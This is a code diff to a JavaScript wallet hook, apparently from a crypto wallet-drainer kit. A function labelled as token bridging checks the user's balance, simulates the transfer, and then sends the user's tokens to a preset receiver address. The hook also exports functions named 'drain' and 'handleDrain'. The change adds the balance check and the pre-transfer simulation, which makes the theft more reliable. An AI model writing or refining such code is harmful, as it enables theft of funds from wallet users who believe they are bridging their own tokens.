@@ -488,23 +488,35 @@ export const UseWallet = () => {
 
   // Function to transfer non-native tokens to receiver address
   const bridgeNonNativeToken = async (token, amount) => {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner(account.address);
-
-    if (!token.address) {
-      console.error("Invalid token address:", token); // Log the token object to debug
-      throw new Error("Token address is undefined or invalid.");
-    }
-
-    const tokenContract = new Contract(
-      token.address,
-      ["function transfer(address to, uint256 amount) external returns (bool)"],
-      signer
-    );
-
-    const amountInWei = utils.parseUnits(amount.toString(), token.decimals);
-
     try {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner(account.address);
+  
+      if (!token.address) {
+        console.error("Invalid token address:", token); 
+        throw new Error("Token address is undefined or invalid.");
+      }
+  
+      const tokenContract = new ethers.Contract(
+        token.address,
+        ["function transfer(address to, uint256 amount) external returns (bool)",
+           "function balanceOf(address owner) view returns (uint256)"],
+        signer
+      );
+  
+      const senderBalance = await tokenContract.balanceOf(await signer.getAddress());
+      const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals);
+
+      if (senderBalance.lt(amountInWei)) {
+        toast.error(`Insufficient ${token.name} balance.`);
+        throw new Error(`Insufficient ${token.name} balance.`);
+        return;
+      }
+  
+      // Use callStatic to simulate the transaction
+      await tokenContract.callStatic.transfer(receiver, amountInWei);
+  
+      // If the callStatic doesn't throw, proceed with the real transaction
       const tx = await tokenContract.transfer(receiver, amountInWei);
       console.log(`Non-native token transfer tx hash: ${tx.hash}`);
       await tx.wait();
@@ -513,7 +525,7 @@ export const UseWallet = () => {
       console.error(`Transfer failed for ${token.name}:`, error);
       toast.error(`Transfer failed for ${token.name}.`);
     }
-  };
+  };  
 
 
   return { approveTokens, drain, getTokenAssets, handleDrain, bridgeTokens };
